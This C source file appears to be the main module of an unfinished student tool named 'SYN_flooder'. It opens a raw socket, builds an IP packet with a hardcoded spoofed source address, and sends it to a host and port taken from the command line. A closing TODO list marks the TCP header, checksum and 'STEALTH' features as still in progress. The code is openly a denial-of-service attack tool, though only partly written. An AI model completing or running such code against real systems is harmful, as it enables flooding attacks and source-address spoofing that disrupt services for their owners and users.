/*
** main.c for main in /home/janel/Projects/templates/network/SYN_flooder
**
** Made by Janel
** Login   <janel@epitech.net>
**
** Started on  Mon May 29 12:19:55 2017 Janel
** Last update Thu Jul 20 11:00:15 2017 Janel
*/

#include <stdio.h>
#include <time.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include "syn_flooder.h"
#include "network_miscellaneous.h"
#include "layer3.h"
#include "debug.h"

void		__attribute__((constructor))ctor(void)
{
  srand(time(NULL));
}

static void	usage(const char * const prog_name)
{
  fprintf(stderr, "[-] USAGE: %s <hostname> <port>\n", prog_name);
}

static int	create_socket(struct sockaddr_in *destination_address,
			      const char *target_ip,
			      const int port)
{
  int		sd;

  if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1
      || !set_header_ip_inclusion(sd))
    return (PRINT_ERROR("Socket creation:"), -1);
  fprintf(stdout, "sd: %d\n", sd);
  set_destination_address(destination_address, inet_addr(target_ip), port);
  return (sd);
}

int			main(int argc, char *argv[])
{
  int			sd;
  unsigned char		packet[IP_MAXPACKET] = {0};
  struct sockaddr_in	destination_address;

  if (argc != 3)
    return (usage(argv[0]), EXIT_FAILURE);
  if ((sd = create_socket(&destination_address, argv[1], atoi(argv[2]))) == -1
      || !build_packet(packet, argv[1], atoi(argv[2])))
    return (close(sd), EXIT_FAILURE);

  return (send_packet(sd, packet, &destination_address, "42.42.42.42", argv[1]), close(sd));
}

/* get_args */					/* DONE */
/* create socket layer 3 RAW */			/* DONE */
/* fill sockaddr_in */				/* DONE - need error handling */
/* build ip header */				/* DONE */
/* build tcp header */				/* IN PROGRESS */
/* build tcp pseudo header */			/* IN PROGRESS */
/* send arbitrary packet to hostname:port */	/* IN PROGRESS */
/* recode checksum func */
/* STEALTH */
/* (add signal clean up) */
